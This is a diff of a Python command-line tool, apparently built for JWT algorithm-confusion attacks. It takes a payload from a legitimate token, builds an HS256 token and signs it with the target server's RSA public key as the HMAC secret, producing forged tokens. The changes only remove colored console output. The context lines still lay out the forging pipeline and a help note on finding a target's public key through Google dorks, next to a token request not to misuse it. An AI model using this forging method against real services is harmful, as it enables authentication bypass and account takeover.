@@ -1,12 +1,12 @@
 #Plz Dont Use It For Black.Be A Good Man :D
 #لطفا برای اهداف سیاه از این ابزار استفاده نکنید . مرد خوبی باش 
-import jwt
+import jwt 
 import os
 import base64
 import binascii
 import json
 import argparse
-from termcolor import colored
+
 
 def genPartialJWT(payload):
     encoded_jwt = jwt.encode(json.loads(payload), '', algorithm='HS256')
@@ -46,8 +46,7 @@ def main():
         - You Must have to know the public key Or Finding With GOOGLE DorK OR .... 
 ###############################################
 """
-    print (colored(banner, "Green"))
-    print (colored(helpbanner, "red"))
+
     parser = argparse.ArgumentParser()
     parser.add_argument('payload', help='JSON payload from legitim JWT')
     parser.add_argument('pubkey', help='Public key file to use for signing')
@@ -61,6 +60,6 @@ def main():
         hex_pub_key = genHexPubKey(pubkey)
         sign = signJWT(partial_jwt, hex_pub_key)
         new_jwt = buildJWT(sign, partial_jwt)
-        print (colored(new_jwt,"green"))
+        print (new_jwt)
 
 main()
